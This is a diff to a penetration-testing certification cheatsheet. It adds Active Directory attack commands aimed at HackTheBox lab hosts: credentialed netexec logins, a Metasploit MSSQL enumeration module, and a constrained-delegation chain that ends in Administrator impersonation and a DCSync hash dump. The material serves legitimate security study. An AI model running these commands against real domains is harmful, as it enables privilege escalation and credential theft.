@@ -59,6 +59,8 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [bloodyAD](#bloodyAD)
 - [impacket](#impacket)
 - [smbclient](#smbclient)
+- [Metasploit](#Metasploit)
+- [Step to privilege escalation in AD](#Step-to-escal)
 - [useful command](#useful-command)
 - 
 - [Useful Resources](#useful-resources)
@@ -837,6 +839,9 @@ netexec ftp  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'
 # auth with ldap by kerberoas when NTLM dissable
 netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k
 
+# auth with mssql by kerberoas when NTLM dissable
+netexec mssql dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --local-auth
+
 # generate and auth by file krb5.conf
 netexec smb 10.10.11.76 --generate-krb5-file krb5.conf
 sudo cp krb5.conf /etc/krb5.conf
@@ -982,6 +987,14 @@ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'a
 
 # import file Administrator.ccache  to dump ntlm 
 KRB5CCNAME=Administrator.ccache impacket-secretsdump  -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
+Metasploit
+
+```
+## Metasploit
+
+```
+# SID  domain enumeration by mssql  ( need credentials) 
+use auxiliary/admin/mssql/mssql_enum_domain_accounts 
 
 ```
 ## smbclient
@@ -1087,6 +1100,27 @@ smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.vol
 
 # run bloodhound  by netexec 
 netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --bloodhound --dns-server 10.10.11.42 --collection all
+Step-to-escal
+
+```
+## Step-to-escal
+```
+## 1. Constrained Delegation ( HELEN.FROST  need have GenericAll permission to machine FS01 and have SeEnableDelegationPrivilege in whoami /priv )
+
+# Enable the Protocol Transition feature and modify UAC (userAccountControl) of machine  FS01$ to enable flag  TRUSTED_TO_AUTH_FOR_DELEGATION
+bloodyAD -d redelegate.vl -u HELEN.FROST -p '0xdf0xdf!' --host 10.129.234.50 add  uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
+
+# write SPN (Service Principal Name) of service  cifs in DC to  msDS-AllowedToDelegateTo object in machine  FS01$ 
+bloodyAD -d redelegate.vl -u HELEN.FROST -p '0xdf0xdf!'  --host "dc.redelegate.vl" set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
+
+# use FS01$ to req KDC give a service ticket (TGS) to access cifs/dc.redelegate.vl  but impersonate user ( or machine)  such as Administrator or DC$  ( have file Administrator.ccache)
+impacket-getST 'redelegate.vl/FS01$:NewPassword123!' -spn cifs/dc.redelegate.vl -impersonate Administrator
+
+#  DCSync to dump DC 
+KRB5CCNAME=Administrator.ccache  impacket-secretsdump -k dc.redelegate.vl
+
+
+
 
 ```
 ## Useful Resources 
